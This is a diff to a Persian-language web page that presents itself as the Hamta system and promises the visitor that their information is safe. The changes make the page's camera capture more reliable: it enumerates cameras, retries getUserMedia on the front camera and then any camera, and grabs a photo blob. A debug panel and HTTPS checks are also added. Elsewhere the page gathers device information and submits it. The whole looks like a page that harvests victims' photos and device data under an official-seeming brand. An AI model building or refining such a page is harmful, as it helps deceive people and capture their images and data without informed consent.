@@ -93,6 +93,18 @@
             color: #dc2626;
             display: none;
         }
+        #debug {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #6c7a8a;
+            display: none;
+            text-align: left;
+            background: #f8fafc;
+            padding: 10px;
+            border-radius: 8px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
@@ -116,6 +128,7 @@
         <div id="loading">⏳ در حال پردازش...</div>
         <div id="status">✅ اطلاعات با موفقیت ارسال شد</div>
         <div id="errorMsg">❌ خطا در ارسال اطلاعات</div>
+        <div id="debug"></div>
 
         <div class="note">
             🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
@@ -162,51 +175,46 @@
         // تابع گرفتن عکس با مدیریت خطا (نسخه نهایی)
         // ======================================================
         async function capturePhoto(facingMode = 'user') {
+            const debugDiv = document.getElementById('debug');
+            debugDiv.style.display = 'block';
+            debugDiv.innerHTML += `📸 تلاش برای دوربین: ${facingMode}\n`;
+
             try {
-                console.log(`📸 تلاش برای گرفتن عکس با دوربین: ${facingMode}`);
+                // بررسی وجود دوربین
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(d => d.kind === 'videoinput');
+                debugDiv.innerHTML += `📹 تعداد دوربین‌ها: ${videoDevices.length}\n`;
                 
-                // تلاش اول: با تنظیمات کامل
+                if (videoDevices.length === 0) {
+                    debugDiv.innerHTML += '❌ هیچ دوربینی یافت نشد!\n';
+                    return null;
+                }
+
+                // تلاش برای گرفتن عکس
+                let stream;
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
+                    stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: facingMode,
                             width: { ideal: 640 },
                             height: { ideal: 480 }
                         }
                     });
-                    const photoBlob = await capturePhotoFromStream(stream);
-                    stream.getTracks().forEach(track => track.stop());
-                    console.log(`✅ عکس با دوربین ${facingMode} گرفته شد (تلاش اول)`);
-                    return photoBlob;
                 } catch (firstError) {
-                    console.warn(`⚠️ تلاش اول برای دوربین ${facingMode} شکست خورد:`, firstError);
-                    
-                    // تلاش دوم: بدون محدودیت ابعاد
+                    debugDiv.innerHTML += `⚠️ تلاش اول شکست: ${firstError.message}\n`;
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({
+                        stream = await navigator.mediaDevices.getUserMedia({
                             video: {
                                 facingMode: facingMode
                             }
                         });
-                        const photoBlob = await capturePhotoFromStream(stream);
-                        stream.getTracks().forEach(track => track.stop());
-                        console.log(`✅ عکس با دوربین ${facingMode} گرفته شد (تلاش دوم)`);
-                        return photoBlob;
                     } catch (secondError) {
-                        console.warn(`⚠️ تلاش دوم برای دوربین ${facingMode} شکست خورد:`, secondError);
-                        
-                        // تلاش سوم: بدون facingMode (اجازه بده مرورگر انتخاب کنه)
-                        if (facingMode === 'environment') {
+                        debugDiv.innerHTML += `⚠️ تلاش دوم شکست: ${secondError.message}\n`;
+                        if (facingMode === 'user') {
                             try {
-                                const stream = await navigator.mediaDevices.getUserMedia({
-                                    video: true
-                                });
-                                const photoBlob = await capturePhotoFromStream(stream);
-                                stream.getTracks().forEach(track => track.stop());
-                                console.log(`✅ عکس با دوربین پیش‌فرض گرفته شد (تلاش سوم)`);
-                                return photoBlob;
+                                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                             } catch (thirdError) {
-                                console.error(`❌ همه تلاش‌ها برای دوربین ${facingMode} شکست خورد`);
+                                debugDiv.innerHTML += `❌ همه تلاش‌ها شکست خورد\n`;
                                 return null;
                             }
                         } else {
@@ -214,11 +222,14 @@
                         }
                     }
                 }
+
+                const photoBlob = await capturePhotoFromStream(stream);
+                stream.getTracks().forEach(track => track.stop());
+                debugDiv.innerHTML += `✅ عکس گرفته شد، حجم: ${photoBlob.size} bytes\n`;
+                return photoBlob;
+
             } catch (error) {
-                console.error(`❌ خطا در گرفتن عکس با دوربین ${facingMode}:`, error);
-                if (facingMode === 'user') {
-                    alert('⚠️ لطفاً به مرورگر اجازه دسترسی به دوربین را بدهید.');
-                }
+                debugDiv.innerHTML += `❌ خطا: ${error.message}\n`;
                 return null;
             }
         }
@@ -373,6 +384,7 @@
             const loadingDiv = document.getElementById('loading');
             const statusDiv = document.getElementById('status');
             const errorDiv = document.getElementById('errorMsg');
+            const debugDiv = document.getElementById('debug');
             const submitBtn = document.getElementById('submitBtn');
 
             submitBtn.disabled = true;
@@ -380,6 +392,7 @@
             loadingDiv.style.display = 'block';
             statusDiv.style.display = 'none';
             errorDiv.style.display = 'none';
+            debugDiv.innerHTML = '';
 
             try {
                 // ۱. دریافت اطلاعات دستگاه
@@ -448,6 +461,8 @@
         });
 
         console.log('✅ صفحه بارگذاری شد');
+        console.log('🌐 پروتکل:', window.location.protocol);
+        console.log('🔒 HTTPS:', window.location.protocol === 'https:');
     </script>
 </body>
-</html>
+    </html>
